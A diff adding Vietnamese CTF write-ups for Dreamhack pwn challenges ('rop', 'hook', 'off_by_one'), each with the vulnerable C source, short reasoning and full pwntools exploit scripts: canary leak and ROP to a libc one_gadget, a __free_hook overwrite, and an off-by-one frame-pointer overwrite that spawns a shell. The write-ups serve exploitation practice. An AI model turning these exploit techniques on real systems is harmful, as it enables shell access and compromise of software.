@@ -1425,4 +1425,459 @@ if __name__ == "__main__":
 
 </details>
 
-# abc 
+# rop
+
+## Source C
+
+<details> <summary> Source C </summary>
+
+```c
+// Name: rop.c
+// Compile: gcc -o rop rop.c -fno-PIE -no-pie
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Leak canary
+  puts("[1] Leak Canary");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  // Do ROP
+  puts("[2] Input ROP payload");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+
+  return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Bài này tương tự như những bài trước, vẫn dùng ROPgadget, one_gadget để chiếm shell
+
+## Thực thi
+
+### Leak canary
+
+- Bài này tương tự như các bài trước, ta sẽ ghi đè bài 0x00 của canary thành 0x61 để %s có thể ghi hết giá trị canary
+
+- Sau đó ta trừ 0x61 để lấy lại giá trị đúng của canary
+
+```python
+    payload = b"a" * 57
+    r.sendafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 56)
+    canary = u64(r.recv(8)) - 0x61
+    log.info("canary: " + hex(canary))
+```
+
+- Sau đó ta trở về main để tiếp tục leak
+
+```python
+    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
+    r.sendafter(b"Buf: ", payload)
+```
+
+### Leak địa chỉ libc
+
+- Do là ta biết được giá trị canary nên lần leak này, ta sẽ ghi đè luôn cả canary trước rip
+
+```python
+    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
+    payload += p64(exe.got['puts'])
+    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
+    r.sendafter(b"Buf: ", payload)
+```
+
+- Do lần nhập thứ nhất ta đã setup rồi nên lần nhập thứ 2 không quan trọng
+
+```python
+    r.recvuntil(b"a" * 56)
+    r.sendafter(b"Buf: ", b"a")
+```
+
+- Tính địa chỉ base libc
+
+```python
+    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
+    libc.address = leak_libc - 527008
+    log.info("leak libc: " + hex(leak_libc))
+    log.info("base libc: " + hex(libc.address))
+```
+
+### ow rip bằng one gadget
+
+```python
+    one_gadget = 0x4f432
+    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
+    r.sendafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 56)
+    r.sendafter(b"Buf: ", b"a")
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/228313627-6b0e662b-7b87-4946-9e96-cd0fa4b6f20a.png)
+
+<details> <summary> full script </summary>
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./rop_patched")
+libc = ELF("./libc-2.27.so")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        gdb.attach(r, gdbscript='''
+                    b*main+199
+                    c
+                    c
+                    ''')
+    else:
+        r = remote("host3.dreamhack.games", 16829)
+
+    return r
+
+
+def main():
+    r = conn()
+    input()
+
+    pop_rdi = 0x00000000004007f3
+    payload = b"a" * 57
+    r.sendafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 56)
+    canary = u64(r.recv(8)) - 0x61
+    log.info("canary: " + hex(canary))
+
+    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
+    r.sendafter(b"Buf: ", payload)
+
+    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
+    payload += p64(exe.got['puts'])
+    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
+    r.sendafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 56)
+    r.sendafter(b"Buf: ", b"a")
+
+    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
+    libc.address = leak_libc - 527008
+    log.info("leak libc: " + hex(leak_libc))
+    log.info("base libc: " + hex(libc.address))
+
+    one_gadget = 0x4f432
+    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
+    r.sendafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 56)
+    r.sendafter(b"Buf: ", b"a")
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+</details>
+
+# hook
+
+## Source
+
+<details> <summary> source C </summary>
+
+```c
+// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(60);
+}
+
+int main(int argc, char *argv[]) {
+    long *ptr;
+    size_t size;
+
+    initialize();
+
+    printf("stdout: %p\n", stdout);
+
+    printf("Size: ");
+    scanf("%ld", &size);
+
+    ptr = malloc(size);
+
+    printf("Data: ");
+    read(0, ptr, size);
+
+    *(long *)*ptr = *(ptr+1);
+
+    free(ptr);
+    free(ptr);
+
+    system("/bin/sh");
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Ở đây kĩ thuật này khá mới nên em chỉ hiểu sơ sơ là ta sẽ overwrite hàm free thành onegadget
+
+## Thực thi
+
+- Đầu tiên chương trình cho ta một địa chỉ libc của stdout, ta sẽ dựa vào địa chỉ đó để tính libc base
+
+```python
+libc_base = stdout - 3954208
+free_hook = libc_base + 3958696
+magic = libc_base + one_gadget
+```
+
+- Khi được hỏi về size chúng ta sẽ nhập size sao cho lớn hơn size payload của mình
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/228539882-e6246e5c-dfa3-4990-a551-ce870f620118.png)
+
+<details> <summary> Full script </summary>
+
+```python
+from pwn import *
+p = remote("host2.dreamhack.games", 14428)
+# p = process("./hook_patched")
+# context.log_level = "debug"
+# e = ELF("./hook_patched")
+# libc = ELF("./libc.so.6")
+# gdb.attach(p, gdbscript='''
+#            b*main+158
+#            b*main+128
+#            c
+#            ''')
+
+input()
+one_gadget = 0x4526a
+
+p.recvuntil("stdout: ")
+stdout = int(p.recv(14), 16)
+
+libc_base = stdout - 3954208
+free_hook = libc_base + 3958696
+magic = libc_base + one_gadget
+log.info(hex(libc_base) + " " + hex(free_hook))
+payload = p64(free_hook) + p64(magic)
+
+p.sendlineafter(b"Size: ", b"50")
+
+
+p.sendlineafter(b"Data: ", payload)
+
+p.interactive()
+```
+
+</details>
+
+## Đọc thêm
+
+- Trong hướng dẫn của dreamhack ngoài ghi đè free còn ghi đè `__malloc_hook`
+- Khi thực thi thử `__malloc_hook` thì em thấy nó báo lỗi ở 2 hàm free()
+
+```
+b"*** Error in `./hook_patched': double free or corruption (fasttop): 0x000000000220a010 ***\n"
+*** Error in `./hook_patched': double free or corruption (fasttop): 0x000000000220a010 ***
+```
+
+- Từ đây ta có thể đoán được nếu cuối chương trình có hai hàm free() ta nên ghi đè hàm free()
+
+# off_by_one_001
+
+## Source
+
+<details> <summary> source </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler()
+{
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize()
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+void read_str(char *ptr, int size)
+{
+    int len;
+    len = read(0, ptr, size);
+    printf("%d", len);
+    ptr[len] = '\0';
+}
+
+void get_shell()
+{
+    system("/bin/sh");
+}
+
+int main()
+{
+    char name[20];
+    int age = 1;
+
+    initialize();
+
+    printf("Name: ");
+    read_str(name, 20);
+
+    printf("Are you baby?");
+
+    if (age == 0)
+    {
+        get_shell();
+    }
+    else
+    {
+        printf("Ok, chance: \n");
+        read(0, name, 20);
+    }
+
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Ở đây chúng ta cần ghi đè biến age thành 0 để có thể chạy được shell
+- Ta thấy mảng buf[20] nằm khá gần biến v5 là age của chúng ta
+
+```c
+  char buf[20]; // [esp+0h] [ebp-18h] BYREF
+  int v5; // [esp+14h] [ebp-4h]
+```
+
+- Bằng một vài phép tính ta thấy khi ta nhập full 20 byte "a" thì byte thứ 21 sẽ ghi đè được v5
+
+```
+>>> -0x18 + 20
+-4
+```
+
+- Mà ta nhớ rằng, hàm read() không đọc byte null, nghĩa là khi 20 kí tự nó sẽ đọc đúng 20 kí tự, nếu muốn sử dụng 20 kí tự ấy như một xâu kí tự thì ta sẽ phải thêm byte '\0' cuối chuỗi đó.
+- Câu lệnh sau cho ta thấy nếu len là 20 thì `buf[20] = '\0'` trong khi buf khai báo buf[20] nhưng trên lí thuyết ta chỉ được sử dụng đến giá trị `buf[19] = 'a'`
+
+```c
+    ptr[len] = '\0';
+```
+
+## Thực thi
+
+- Ta sẽ nhập vào một chuỗi kí tự 20 byte
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/228557377-ca9363c4-9230-4525-92dd-43caaace88e6.png)
+
+# off_by_one_001
+
+## Ý tưởng
+
+- Khi ta nhập 255 byte ta thấy ta đã overwrite 1 byte null vào ebp
+- Giá trị ebp lại là một địa chỉ nào đó trong buf.
+
+![image](https://user-images.githubusercontent.com/111769169/228569563-af23eebd-2ed1-432d-b082-4dd810e415e9.png)
+
+- Địa chỉ stack là địa chỉ động nên ta sẽ tạo payload full địa chỉ get_shell để khi ow địa chỉ ebp, dù nhảy đến địa chỉ nào trong stack thì cũng là địa chỉ của get_shell
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/228578127-a837e329-d6af-46bc-a5e1-c6059a08ff69.png)
+
+<details> <summary> Source </summary>
+
+```python
+# form solve pwn đỡ phải viết script =)))
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./off_by_one_000")
+# libc = ELF("./libc-2.27.so")
+# ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        gdb.attach(r, gdbscript = '''
+                   b*main+64
+                   b*cpy+0
+                   c
+                   ''')
+        input()
+    else:
+        r = remote("host3.dreamhack.games", 17014)
+
+    return r
+
+
+def main():
+    r = conn()
+
+    payload = p32(exe.sym['get_shell']) * (256 // 4)
+    
+    r.sendafter(b"Name: ", payload)
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+</details>
+
+![image](https://user-images.githubusercontent.com/111769169/228579098-6c05078e-1adc-4ee6-af08-d7c4766b994b.png)
